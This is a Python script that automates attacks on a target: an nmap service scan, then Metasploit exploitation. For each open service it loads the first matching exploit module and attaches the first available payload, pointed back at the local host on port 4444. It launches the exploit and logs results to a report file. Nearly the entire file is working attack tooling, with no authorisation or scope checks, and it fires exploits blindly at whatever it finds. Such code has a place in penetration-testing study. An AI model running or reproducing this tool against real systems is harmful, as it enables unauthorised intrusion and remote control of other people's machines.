import os
import datetime
from pymetasploit3.msfrpc import MsfRpcClient
import subprocess
import socket
from prettytable import PrettyTable


def get_local_ip():
    """
    Detects the local IP address of the host.
    """
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception as e:
        print(f"Error getting local IP: {e}")
        return None


def nmap_scan(target, start_port=1, end_port=65535):
    """
    Scans the target for open ports and services using Nmap.
    """
    try:
        print(f"\n[+] Scanning {target} for open ports and services from {start_port} to {end_port}...\n")
        command = ["nmap", "-sV", f"-p{start_port}-{end_port}", target]
        result = subprocess.run(
            command, capture_output=True, text=True, check=True
        )
        open_ports = []
        for line in result.stdout.splitlines():
            if "open" in line:
                parts = line.split()
                port = parts[0].split('/')[0]
                service = parts[2] if len(parts) > 2 else "unknown"
                version = " ".join(parts[3:]) if len(parts) > 3 else "-"
                open_ports.append({
                    "port": port,
                    "service": service,
                    "version": version
                })
        return open_ports
    except subprocess.CalledProcessError as e:
        print(f"Nmap scan failed: {e}")
        return []


def connect_to_metasploit(password="your_password"):
    """
    Connects to the Metasploit RPC server using PyMetasploit3.
    """
    try:
        client = MsfRpcClient(password, port=55552)
        print("\n[+] Connected to Metasploit Framework.")
        return client
    except Exception as e:
        print(f"[-] Failed to connect to Metasploit RPC server: {e}")
        return None


def search_and_run_exploit(client, service, target_ip, port, local_ip):
    """
    Searches for exploits in Metasploit and attempts to run them.
    Dynamically validates and sets required options.
    Returns a tuple of (module_name, success).
    """
    print(
        f"\n[+] Searching for exploits for service: {service} on port {port}...")
    exploits = client.modules.search(service)

    if not exploits:
        print(f"[-] No exploits found for {service} on port {port}.")
        return None, False

    # Pick the first exploit
    exploit_info = next((e for e in exploits if e["type"] == "exploit"), None)
    if not exploit_info:
        print(f"[-] No suitable exploits found for {service}.")
        return None, False

    module_name = exploit_info["fullname"]
    print(
        f"[+] Loaded exploit: {module_name} to attack service {service} on port {port}")

    # Load the exploit module
    exploit = client.modules.use("exploit", module_name)

    # Set exploit options dynamically
    if "RHOSTS" in exploit.options:
        exploit["RHOSTS"] = target_ip
    else:
        print(f"Warning: Exploit {module_name} does not support RHOSTS.")

    if "RPORT" in exploit.options:
        exploit["RPORT"] = port
    else:
        print(f"Warning: Exploit {module_name} does not support RPORT.")

    # Dynamically fetch supported payloads
    supported_payloads = exploit.payloads
    print(f"Supported payloads for {module_name}: {supported_payloads}")
    if not supported_payloads:
        print(f"No payloads available for {module_name}.")
        return module_name, False

    # Use the first compatible payload
    payload_name = supported_payloads[0]
    print(f"Using payload: {payload_name}")
    payload = client.modules.use("payload", payload_name)

    # Retrieve and log payload options
    print(f"Options for payload {payload_name}: {payload.options}")

    # Set payload options dynamically
    if "LHOST" in payload.options:
        payload["LHOST"] = local_ip
    else:
        print(f"Warning: Payload {payload_name} does not support LHOST.")

    if "LPORT" in payload.options:
        payload["LPORT"] = 4444
    else:
        print(f"Warning: Payload {payload_name} does not support LPORT.")

    # Execute the exploit
    try:
        job_id = exploit.execute(payload=payload)
        print(f"[+] Exploit {module_name} launched as job {job_id}.")
        return module_name, True
    except Exception as e:
        print(f"[-] Failed to execute exploit {module_name}: {e}")
        return module_name, False

    print("Port Testing Complete")


def port_exploit_report(directory, target_ips, nmap_table, results):
    """
    Appends Nmap scan results and exploitation results to a report file.

    Args:
        directory (str): Path to the directory where the report will be stored.
        target_ips (list): The list of target IP addresses that were scanned.
        nmap_table (dict): Nmap scan results as a dictionary of lists.
        results (dict): Exploitation results as a dictionary of lists.
    """
    # Ensure the reports directory exists
    os.makedirs(directory, exist_ok=True)

    # Generate a sanitized timestamp for the filename
    raw_timestamp = datetime.datetime.now().strftime("%d/%m/%y-%H:%M")
    sanitized_timestamp = raw_timestamp.replace("/", "_").replace(":", "-")
    file_name = os.path.join(directory, f"{sanitized_timestamp}.txt")

    try:
        with open(file_name, "w") as report_file:
            report_file.write(
                f"Scan Time: {datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')}\n"
            )
            report_file.write("-" * 50 + "\n")

            for ip in target_ips:
                if ip not in nmap_table or ip not in results:
                    continue  # Skip if no results for IP

                report_file.write(f"IP Address: {ip}\n\n")

                # Scan Results Table
                report_file.write("Scan Results:\n")
                nmap_table_output = PrettyTable(["Port", "Service", "Version"])
                for result in nmap_table[ip]:
                    nmap_table_output.add_row([result['port'], result['service'], result['version']])
                report_file.write(f"{nmap_table_output}\n")
                report_file.write("-" * 50 + "\n")

                # Exploitation Results Table
                report_file.write("\nExploitation Results:\n")
                exploit_table = PrettyTable(["Service", "Port", "Exploit", "Status"])
                for result in results[ip]:
                    exploit_table.add_row([result['service'], result['port'], result['exploit'], result['status']])
                report_file.write(f"{exploit_table}\n")
                report_file.write("=" * 50 + "\n\n")  # Blank line before the next IP section

    except Exception as e:
        print(f"[-] Failed to write to report file: {e}")
